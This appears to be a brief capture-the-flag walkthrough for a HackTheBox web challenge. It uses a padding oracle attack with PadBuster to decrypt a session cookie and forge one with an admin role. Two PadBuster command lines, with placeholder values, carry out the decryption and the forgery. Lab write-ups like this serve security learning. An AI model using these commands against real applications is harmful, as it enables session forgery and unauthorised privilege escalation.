#Created an account on page

#Checked request and response

#Noticed a PHP Session and iknowmag1k cookie on GET request to /profile.php

#Read up on Oracle Padding attacks and used Padbuster. Used Padbuster on the 
iknowmag1ck cookie with a block size of 8. Returned was "{ user : , role : }"

- padbuster http://docker.hackthebox.eu:<port> iknowmag1ck_cookie -8 --cookies
phpsession_cookie=< >;iknowmag1ck_cookie=< >

#Used Padbuster to change role to admin 
- padbuster http://docker.hackthebox.eu:<port> iknowmag1ck_cookie -8 --cookies
phpsession_cookie=< >;iknowmag1ck_cookie=< > -encoding=0 -plaintext={"user": , "role":"admin"}

#Made same GET request to /profile.php accept with new iknowmag1k cookie
- flag